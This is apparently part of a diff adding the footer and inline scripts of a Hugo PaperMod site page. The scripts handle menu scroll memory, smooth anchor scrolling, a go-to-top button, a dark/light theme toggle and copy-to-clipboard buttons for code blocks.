+        <a href="https://gohugo.io/?utm_source=papermod" rel="noopener" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" id="top-link" class="top-link hidden" aria-label="go to top" title="Go to Top (Alt + G)" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevrons-up">
+        <polyline points="17 11 12 6 7 11"></polyline>
+        <polyline points="17 18 12 13 7 18"></polyline>
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var toplink = document.getElementById("top-link");
+    window.onscroll = function () {
+        const scrollThreshold = window.innerHeight;
+        if (document.body.scrollTop > scrollThreshold || document.documentElement.scrollTop > scrollThreshold) {
+            toplink.classList.remove("hidden");
+        } else {
+            toplink.classList.add("hidden");
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
